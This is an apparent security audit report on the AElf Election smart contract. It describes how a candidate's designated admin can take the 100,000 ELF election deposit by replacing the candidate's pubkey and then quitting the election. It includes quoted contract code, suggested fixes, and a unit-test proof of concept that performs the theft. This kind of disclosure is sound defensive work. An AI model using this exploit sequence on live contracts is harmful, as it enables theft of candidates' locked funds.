# Audit Report

## Title
Admin Can Steal Locked Election Tokens via Pubkey Replacement

## Summary
A malicious admin can steal 100,000 ELF tokens locked during election announcement by exploiting the interaction between `AnnounceElection`, `ReplaceCandidatePubkey`, and `QuitElection`. The vulnerability arises from `AnnounceElection` not setting the sponsor mapping, allowing the admin to replace the candidate's pubkey with one they control and redirect the refund to their own address.

## Finding Description

When a candidate announces election using `AnnounceElection`, they must designate an admin address. [1](#0-0)  The method locks 100,000 ELF tokens as deposit. [2](#0-1) 

**Critical Issue #1**: Unlike `AnnounceElectionFor`, the `AnnounceElection` method does NOT set the `CandidateSponsorMap`. [3](#0-2)  This mapping is used to track who should receive the refund when quitting election.

**Critical Issue #2**: The admin can call `ReplaceCandidatePubkey` to replace the candidate's pubkey. The permission check only validates that the caller is the admin. [4](#0-3)  During replacement, the sponsor mapping is transferred, but since it was null for `AnnounceElection` candidates, it remains null. [5](#0-4) 

The candidate information, including the original `AnnouncementTransactionId` used as the lock ID, is also transferred to the new pubkey. [6](#0-5) 

**Critical Issue #3**: When the admin calls `QuitElection` with the new pubkey, the refund logic uses a fallback mechanism. [7](#0-6)  At line 245, since `CandidateSponsorMap[input.Value]` is null, it falls back to `Address.FromPublicKey(pubkeyBytes)`. The `pubkeyBytes` variable comes from line 231, which converts the input pubkey (the admin's new controlled pubkey) to bytes. Therefore, tokens are transferred to the admin's controlled address instead of the original candidate.

The only constraint is that the new pubkey cannot already be a registered candidate. [8](#0-7)  However, the admin can trivially bypass this by generating a fresh keypair.

## Impact Explanation

This vulnerability enables direct theft of election deposit funds. The lock amount is 100,000 ELF per candidate. [9](#0-8) 

Every candidate who uses `AnnounceElection` (as opposed to `AnnounceElectionFor`) and designates an external admin is vulnerable. The candidate has no mechanism to recover the stolen tokens once the attack is executed. This breaks the critical security invariant that locked election tokens must be returned to the rightful owner (either the candidate themselves or a designated sponsor).

With potentially dozens of candidates in the system, the total exposure could exceed millions of dollars in ELF tokens, completely undermining trust in the election system. The election deposit mechanism is designed to ensure commitment and prevent spam candidates - allowing admins to steal these deposits defeats this purpose entirely.

## Likelihood Explanation

The attack requires:
1. **Admin privileges** - explicitly granted by candidates during announcement as a required parameter
2. **Two straightforward transaction calls**: `ReplaceCandidatePubkey` followed by `QuitElection`
3. **A pubkey controlled by the admin** - trivially obtained by generating a new keypair

The attack complexity is LOW with no timing constraints, no race conditions, and no external dependencies. The precondition (being set as admin) is explicitly granted by candidates who trust the admin address for key management purposes. Many candidates designate organization addresses or multisigs as admins for operational security.

Candidates have no way to detect this attack before execution, and once executed, the theft is irreversible. The attack can be performed immediately after election announcement with no waiting period. The economic incentive is extremely high: steal 100,000 ELF tokens for the cost of just 2 transaction fees (negligible).

## Recommendation

The fix should ensure refunds always go to the correct recipient. Two approaches:

**Option 1**: Store the original sponsor/candidate address at announcement time and never change it during pubkey replacement:

```csharp
// In AnnounceElection, store the original refund recipient
State.CandidateRefundRecipientMap[pubkey] = Context.Sender;

// In ReplaceCandidatePubkey, transfer this mapping
State.CandidateRefundRecipientMap[newPubkey] = State.CandidateRefundRecipientMap[oldPubkey];

// In QuitElection, use the stored recipient
var refundRecipient = State.CandidateRefundRecipientMap[input.Value] 
    ?? State.CandidateSponsorMap[input.Value] 
    ?? Address.FromPublicKey(pubkeyBytes);
```

**Option 2**: Set `CandidateSponsorMap` in `AnnounceElection` to the candidate's own address:

```csharp
// In AnnounceElection after line 108
State.CandidateSponsorMap[pubkey] = Context.Sender;
```

Option 2 is simpler and creates consistency between `AnnounceElection` and `AnnounceElectionFor`.

## Proof of Concept

```csharp
[Fact]
public async Task AdminCanStealLockedTokensViaReplaceCandidatePubkey()
{
    // Setup: Alice announces election with Bob as admin
    var aliceKeyPair = ValidationDataCenterKeyPairs[0];
    var bobKeyPair = ValidationDataCenterKeyPairs[1];
    var bobAddress = Address.FromPublicKey(bobKeyPair.PublicKey);
    
    // Alice announces with Bob as admin
    var aliceStub = GetElectionContractTester(aliceKeyPair);
    await aliceStub.AnnounceElection.SendAsync(bobAddress);
    
    // Record Alice's balance before attack
    var aliceAddress = Address.FromPublicKey(aliceKeyPair.PublicKey);
    var aliceBalanceBefore = (await TokenContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = aliceAddress, Symbol = "ELF" })).Balance;
    
    // Bob generates a malicious keypair he controls
    var maliciousKeyPair = ValidationDataCenterKeyPairs[2];
    var maliciousAddress = Address.FromPublicKey(maliciousKeyPair.PublicKey);
    var maliciousBalanceBefore = (await TokenContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = maliciousAddress, Symbol = "ELF" })).Balance;
    
    // Bob replaces Alice's pubkey with his controlled pubkey
    var bobStub = GetElectionContractTester(bobKeyPair);
    await bobStub.ReplaceCandidatePubkey.SendAsync(new ReplaceCandidatePubkeyInput
    {
        OldPubkey = aliceKeyPair.PublicKey.ToHex(),
        NewPubkey = maliciousKeyPair.PublicKey.ToHex()
    });
    
    // Bob quits election with the malicious pubkey, stealing the tokens
    await bobStub.QuitElection.SendAsync(new StringValue 
    { 
        Value = maliciousKeyPair.PublicKey.ToHex() 
    });
    
    // Verify: Tokens went to malicious address instead of Alice
    var maliciousBalanceAfter = (await TokenContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = maliciousAddress, Symbol = "ELF" })).Balance;
    var aliceBalanceAfter = (await TokenContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = aliceAddress, Symbol = "ELF" })).Balance;
    
    // Alice's 100k ELF were stolen
    maliciousBalanceAfter.ShouldBe(maliciousBalanceBefore + 100_000_00000000);
    aliceBalanceAfter.ShouldBe(aliceBalanceBefore); // Alice got nothing back
}
```

## Notes

This vulnerability specifically affects candidates who use `AnnounceElection` rather than `AnnounceElectionFor`. The design intention appears to be that `AnnounceElectionFor` is for sponsored candidates (where a sponsor pays the deposit) while `AnnounceElection` is for self-sponsoring candidates. However, the lack of sponsor tracking in `AnnounceElection` creates this exploitable gap when combined with the pubkey replacement feature.

The admin role is intended for operational purposes (replacing compromised keys), but the current implementation allows admins to abuse this privilege for theft. This is a privilege escalation issue where admin rights should not include the ability to redirect locked funds.

### Citations

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L93-103)
```csharp
    public override Empty AnnounceElection(Address input)
    {
        var recoveredPublicKey = Context.RecoverPublicKey();
        AnnounceElection(recoveredPublicKey);

        var pubkey = recoveredPublicKey.ToHex();
        var address = Address.FromPublicKey(recoveredPublicKey);

        Assert(input.Value.Any(), "Admin is needed while announcing election.");
        Assert(State.ManagedCandidatePubkeysMap[address] == null, "Candidate cannot be others' admin.");
        State.CandidateAdmins[pubkey] = input;
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L121-141)
```csharp
    public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
    {
        var pubkey = input.Pubkey;
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
        var address = Address.FromPublicKey(pubkeyBytes);
        AnnounceElection(pubkeyBytes);
        var admin = input.Admin ?? Context.Sender;
        State.CandidateAdmins[pubkey] = admin;
        var managedPubkeys = State.ManagedCandidatePubkeysMap[admin] ?? new PubkeyList();
        managedPubkeys.Value.Add(ByteString.CopyFrom(pubkeyBytes));
        State.ManagedCandidatePubkeysMap[admin] = managedPubkeys;
        LockCandidateNativeToken();
        AddCandidateAsOption(pubkey);
        if (State.Candidates.Value.Value.Count <= GetValidationDataCenterCount())
        {
            State.DataCentersRankingList.Value.DataCenters.Add(pubkey, 0);
            RegisterCandidateToSubsidyProfitScheme(pubkey);
        }

        State.CandidateSponsorMap[input.Pubkey] = Context.Sender;
        return new Empty();
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L177-195)
```csharp
    private void LockCandidateNativeToken()
    {
        if (State.TokenContract.Value == null)
            State.TokenContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

        // Lock the token from sender for deposit of announce election
        var lockId = Context.OriginTransactionId;
        var lockVirtualAddress = Context.ConvertVirtualAddressToContractAddress(lockId);
        var sponsorAddress = Context.Sender;
        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = sponsorAddress,
            To = lockVirtualAddress,
            Symbol = Context.Variables.NativeSymbol,
            Amount = ElectionContractConstants.LockTokenForElection,
            Memo = "Lock for announcing election."
        });
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L229-249)
```csharp
    public override Empty QuitElection(StringValue input)
    {
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(input.Value);
        QuitElection(pubkeyBytes);
        var pubkey = input.Value;

        var initialPubkey = State.InitialPubkeyMap[pubkey] ?? pubkey;
        Assert(Context.Sender == State.CandidateAdmins[initialPubkey], "Only admin can quit election.");
        var candidateInformation = State.CandidateInformationMap[pubkey];

        // Unlock candidate's native token.
        var lockId = candidateInformation.AnnouncementTransactionId;
        var lockVirtualAddress = Context.ConvertVirtualAddressToContractAddress(lockId);
        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = lockVirtualAddress,
            To = State.CandidateSponsorMap[input.Value] ?? Address.FromPublicKey(pubkeyBytes),
            Symbol = Context.Variables.NativeSymbol,
            Amount = ElectionContractConstants.LockTokenForElection,
            Memo = "Quit election."
        });
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L173-184)
```csharp
    public override Empty ReplaceCandidatePubkey(ReplaceCandidatePubkeyInput input)
    {
        Assert(IsCurrentCandidateOrInitialMiner(input.OldPubkey),
            "Pubkey is neither a current candidate nor an initial miner.");
        Assert(!IsPubkeyBanned(input.OldPubkey) && !IsPubkeyBanned(input.NewPubkey),
            "Pubkey is in already banned.");

        // Permission check.
        Assert(Context.Sender == GetCandidateAdmin(new StringValue { Value = input.OldPubkey }), "No permission.");

        // Record the replacement.
        PerformReplacement(input.OldPubkey, input.NewPubkey);
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L191-191)
```csharp
        Assert(!candidates.Value.Contains(newPubkeyBytes), "New pubkey is already a candidate.");
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L237-243)
```csharp
        var candidateInformation = State.CandidateInformationMap[input.OldPubkey];
        if (candidateInformation != null)
        {
            candidateInformation.Pubkey = input.NewPubkey;
            State.CandidateInformationMap[input.NewPubkey] = candidateInformation;
            State.CandidateInformationMap.Remove(input.OldPubkey);
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L320-321)
```csharp
        State.CandidateSponsorMap[newPubkey] = State.CandidateSponsorMap[oldPubkey];
        State.CandidateSponsorMap.Remove(oldPubkey);
```

**File:** contract/AElf.Contracts.Election/ElectionContractConstants.cs (L5-5)
```csharp
    public const long LockTokenForElection = 100_000_00000000;
```
